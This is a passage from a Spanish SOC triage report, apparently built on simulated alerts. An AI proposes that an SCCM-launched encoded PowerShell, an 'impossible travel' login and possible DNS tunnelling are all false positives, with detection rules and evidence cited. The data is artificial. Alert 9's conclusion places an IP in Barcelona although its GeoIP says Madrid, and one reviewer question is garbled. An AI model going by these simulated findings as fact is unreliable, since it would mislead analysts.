- `EDR-0005357` (edr_events): powershell.exe iniciado por CcmExec.exe (padre, pid 1880) como NT AUTHORITY\SYSTEM con -EncodedCommand; el comando descodificado es '$inv = Get-CimInstance Win32_Product / Select Name,Version / ConvertTo-Json / Out-File C:\Windows\CCM\Inventory\sw.json'.
- (alerta): La alerta indica explícitamente que el padre es CcmExec.exe (agente SCCM) y que el preview descodificado es una volcado de inventario de software a C:\Windows\CCM\Inventory\sw.json.
- `EDR-0004885` (edr_events): El host WS-BCN-1993 pertenece a david.sanz en zona HQ-USERS, criticidad Media, sin exposición a Internet; el resto de eventos del día son uso normal de oficina (EXCEL, chrome, OUTLOOK, Acrobat, ms-teams). — *evento que no venía en la alerta*
- `PRX-0008693` (proxy): El tráfico del host en la ventana es solo a destinos corporativos legítimos (api.anthropic.com, login.microsoftonline.com, sharepoint.com, salesforce.com, s3.amazonaws.com), sin comunicación con infraestructura sospechosa. — *evento que no venía en la alerta*
- (alerta): No hay cambios aprobados ni flujos autorizados en el contexto, y la inteligencia de indicadores y el sandbox están vacíos (indicador sin información).

**Qué decide el código** (política del SOC, no la IA)

- Gravedad: Falso positivo: gravedad informativa (la matriz daría media).
- Plazo (SLA): triaje en Revisión en lote diaria; No; avisar a: —.

**Acciones (contención y escalado)**

- No se propone contención.
- Escalado: Cerrar.

**Preguntas abiertas para quien lo revise**

- ¿Convierte ajustar la regla para excluir las ejecuciones de PowerShell originadas por CcmExec.exe con destino a C:\Windows\CCM\Inventory, evitando falsos positivos recurrentes?

### 9. ALR-20261005-000043 — Inicio de sesión de Javier Sanz desde Barcelona y luego desde Dublín en menos de 30 minutos

**Conclusión: Falsa alarma · gravedad informativa · Cerrar**

**Por qué ha saltado**

- Regla `UC-IDP-001` (Viaje imposible) de IDP, gravedad de la regla Media.
- Dos inicios de sesión exitosos desde ubicaciones incompatibles en el tiempo transcurrido.
- Hora de la alerta: 05/10/2026 08:58 (hora de España).

**Qué se ha investigado**

- 20 consultas a la API del SOC: 1 de directorio de personas, 2 de inteligencia, 3 de calendario de cambios, 14 de registros ±24 h (fuentes: ad_events, idp_audit, idp_signins, vpn).
- Inteligencia de `198.18.200.10`: desconocida (no es limpia); GeoIP: Madrid, ES, Orange Espagne.
- Inteligencia de `198.18.10.185`: desconocida (no es limpia); GeoIP: Dublín, IE, Microsoft (salida de Private Relay/VPN del móvil, simulado), hosting.
- Calendario de cambios: ningún cambio aprobado que lo cubra.

**Qué concluye la IA** (propone; confianza 0.85)

> La regla «Viaje imposible» dispara por dos inicios de sesión exitosos del usuario Javier Sanz en menos de 30 minutos desde Barcelona (198.18.200.10) y Dublín (198.18.10.185). Sin embargo, el segundo origen es la salida de Private Relay/VPN del propio móvil corporativo (Microsoft, Irlanda), un mecanismo legítimo de privacidad del dispositivo, no un acceso real desde Irlanda. El primer inicio de sesión ya se repite en otras 200 sesiones de usuarios distintos desde la misma IP 198.18.200.10, lo que confirma que es la salida corporativa habitual de Barcelona, no un origen geográfico único. No existe autorización explícita que citar, pero la actividad detectada no es un ataque: es el comportamiento normal de un usuario con móvil corporativo conforme usando VPN/Private Relay, por lo que la regla se equivoca.

Pruebas que cita:

- `SIGN-0003550` (alerta): El segundo inicio de sesión (Outlook-iOS en iPhone) proviene de 198.18.10.185 en Dublín, Irlanda, con AS8075 «Microsoft (salida de Private Relay/VPN del móvil, simulado)», device_compliant=true y MFA TOTP satisfecho; es la salida VPN del propio dispositivo, no un acceso físico desde Irlanda.
- `SIGN-0003549` (alerta): El primer inicio de sesión (Microsoft Teams en Edge/Windows) proviene de 198.18.200.10 en Barcelona, ES, con device_compliant=true y MFA TOTP satisfecho; el primer login real es legítimo.
- `SIGN-0002714` (alerta): La IP 198.18.200.10 de Barcelona aparece en otras 200 sesiones de usuarios distintos (celia.riera, ivan.ortega, patricia.marin, paula.pujol...) en el mismo rango horario, confirmando que es una salida corporativa compartida de HQ, no un origen geográfico único del usuario. — *evento que no venía en la alerta*

**Qué decide el código** (política del SOC, no la IA)

- Gravedad: Falso positivo: gravedad informativa (la matriz daría media).
- Plazo (SLA): triaje en Revisión en lote diaria; No; avisar a: —.

**Acciones (contención y escalado)**

- No se propone contención.
- Escalado: Cerrar.

**Preguntas abiertas para quien lo revise**

- Confirmar con el equipo de identidad que la salida 198.18.10.185 corresponde efectivamente a Microsoft Private Relay del dispositivo mob-28a90bad y no a un reenvío malicioso.
- Verificar si la regla «Viaje imposible» debería excluir las salidas de Private Relay/VPN del móvil de la lógica de geolocalización.

### 10. ALR-20261005-000456 — Consultas DNS a subdominios largos de avqs.mcafee.com desde un portátil de Barcelona

**Conclusión: Falsa alarma · gravedad informativa · Cerrar**

**Por qué ha saltado**

- Regla `UC-NET-006` (Posible túnel DNS) de DNS, gravedad de la regla Media.
- Más de 200 consultas en 1 h a subdominios largos (>40 caracteres) de un mismo dominio.
- Hora de la alerta: 05/10/2026 10:11 (hora de España).

**Qué se ha investigado**

- 19 consultas a la API del SOC: 1 de inventario de equipos, 1 de inteligencia, 3 de calendario de cambios, 14 de registros ±24 h (fuentes: dns, edr_events, firewall, proxy).
- Inteligencia de `avqs.mcafee.com`: desconocida (no es limpia).
- Equipo `WS-BCN-1223`: Portátil, criticidad media.
- Calendario de cambios: ningún cambio aprobado que lo cubra.

**Qué concluye la IA** (propone; confianza 0.8)

> La regla detecta un posible túnel DNS por más de 200 consultas en 1 h a subdominios largos de avqs.mcafee.com desde WS-BCN-1223. La evidencia muestra que todas las consultas responden a 127.0.0.2 con NOERROR, patrón típico de resolución local de un agente de seguridad (Mcafee) y no de exfiltración. El dominio no aparece en los logs de firewall ni proxy, lo que descarta tráfico saliente real. El propio host realiza navegación web normal (Google, banca, Salesforce) en el mismo periodo. La actividad es rutinaria de software de gestión y no existe autorización explícita citable que la justifique como caso autorizado.

Pruebas que cita:

- `DNS-0008400` (eventos_citados_en_la_alerta): Las consultas a subdominios largos de avqs.mcafee.com responden todas a 127.0.0.2 con NOERROR, patrón de resolución local, no de canal externo.
- `DNS-0016793` (contexto_logs): Otro host (WS-MAD-1925) resuelve el mismo dominio a 127.0.0.2 el día siguiente, indicando un comportamiento extendido por la red, no un incidente aislado. — *evento que no venía en la alerta*
- `DNS-0001820` (contexto_logs): El host WS-BCN-1223 realiza navegación web normal (akamaized.net, Google, Caixabank, Salesforce) en el mismo periodo. — *evento que no venía en la alerta*
- `firewall_avqs` (contexto_logs): No hay ningún registro de firewall ni proxy para avqs.mcafee.com, lo que descarta tráfico saliente real hacia ese dominio.
- `EDR-0005359` (contexto_logs): Un PowerShell con comando codificado ejecutado por CcmExec.exe (inventario de software SCCM) confirma actividad de gestión rutinaria en el host, aunque no está vinculado directamente al dominio. — *evento que no venía en la alerta*

**Qué decide el código** (política del SOC, no la IA)

- Gravedad: Falso positivo: gravedad informativa (la matriz daría media).
- Plazo (SLA): triaje en Revisión en lote diaria; No; avisar a: —.

**Acciones (contención y escalado)**

- No se propone contención.
- Escalado: Cerrar.

**Preguntas abiertas para quien lo revise**

- Confirmar con el equipo de seguridad qué agente/producto de Mcafee usa avqs.mcafee.com para resolución local (127.0.0.2).
- Verificar si el patrón se repite en otros hosts y si corresponde a un servicio legítimo de actualización o telemetría del agente.

---

Los tickets completos (formato `ticket_salida.schema.json` de Deloitte, validados) están en `REPORTE_10_ALERTAS_tickets.json`. Lo que esta solución no resuelve: `docs/limitaciones.md`.
